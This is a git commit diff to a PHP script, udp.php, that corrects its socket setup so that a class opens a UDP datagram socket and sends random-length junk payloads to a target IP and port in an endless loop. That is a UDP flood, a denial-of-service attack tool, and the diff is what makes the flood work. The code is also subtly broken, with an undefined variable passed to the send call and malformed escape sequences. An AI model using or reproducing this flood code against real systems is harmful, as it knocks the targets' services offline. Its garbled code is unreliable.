a02a2ad8d9276450b71da7e281f02b4c1c4e96ad
Barashkadevs <58213059+Barashkadevs@users.noreply.github.com>
2020-03-17 22:54:04 +0500

    Add files via upload

--- udp.php
+++ udp.php
@@ -11,7 +11,7 @@ $udp = new UDP($address, $port);
 
 class UDP{
 	public function __construct(String $ip, Int $port) {
-		$os = socket_create(AF_UNIX, SOCK_STREAM, SOL_UDP);
+		$os = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
 		while(true) {
 			$message = str_repeat("\jnX\x0\x\x12\x34\x96\x2048\x2048f\x8000b", mt_rand(1000, 5000));
 			socket_sendto($os, $messages, strlen($message), MSG_EOF, $ip, $port);
